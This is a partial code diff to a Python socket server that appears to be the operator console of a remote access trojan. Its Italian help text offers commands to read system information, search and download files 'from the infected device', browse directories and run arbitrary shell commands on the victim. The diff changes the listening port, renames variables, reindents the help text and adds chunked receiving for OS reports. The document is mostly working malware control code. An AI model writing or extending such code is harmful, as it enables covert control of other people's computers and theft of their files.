@@ -3,7 +3,7 @@ from socket import *
 import time
 from threading import Thread
 
-serverPort = 12018
+serverPort = 12007
 
 windowsFlag = "n"
 stop_threads = False
@@ -124,16 +124,16 @@ def searchFile(connectionSocket, fileName):
 #    print(output)
 #    return output
 
-def longRecv(socket: socket):
-    ln = socket.recv(1024).decode()
+def longRecv(serverSocket: socket):
+    ln = serverSocket.recv(1024).decode()
     lung = int(ln)
-    socket.send("hello".encode())
+    serverSocket.send("hello".encode())
     result: bytes
-    result = socket.recv(1024)
-    socket.send("a".encode())
+    result = serverSocket.recv(1024)
+    serverSocket.send("a".encode())
     for i in range(1, lung):
-        result = result.__add__(socket.recv(1024))
-        socket.send("a".encode())
+        result = result.__add__(serverSocket.recv(1024))
+        serverSocket.send("a".encode())
 
     return result.decode()
 
@@ -167,10 +167,10 @@ def main():
             connectionSocket.send("cd .".encode())
             pwd = connectionSocket.recv(1024).decode()
             help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
-                   "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
-                   "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
-                   "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
-                   "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
+                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
+                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
+                    "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
+                    "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
             while not esc:
                 cmd = input('>>')
                 connectionSocket.send(cmd.encode())
@@ -200,7 +200,7 @@ def main():
                         getFile(connectionSocket, fileName)
 
                 elif cmd == "infoOs":
-                    d = connectionSocket.recv(1024).decode()
+                    d = longRecv(connectionSocket)
                     print(d)
                     LogOnFile("infoOs.txt", d)
 
